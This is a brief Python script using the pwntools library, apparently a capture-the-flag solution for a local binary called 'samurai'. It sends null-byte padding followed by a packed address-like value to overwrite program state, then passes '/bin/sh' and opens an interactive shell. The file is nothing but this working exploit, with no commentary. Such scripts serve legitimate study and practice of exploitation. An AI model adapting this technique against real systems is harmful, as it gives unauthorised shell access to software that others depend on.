from pwn import *

if __name__ == '__main__':
    elf = context.binary = ELF('./samurai')

    io = process()

    io.recvuntil(b'what was it again? ')

    io.sendline(b'\0' * 30 + p32(0x4774cc))

    io.recvuntil(b'our hero prepares a final blow: ')

    io.sendline(b'/bin/sh\0')

    io.interactive()
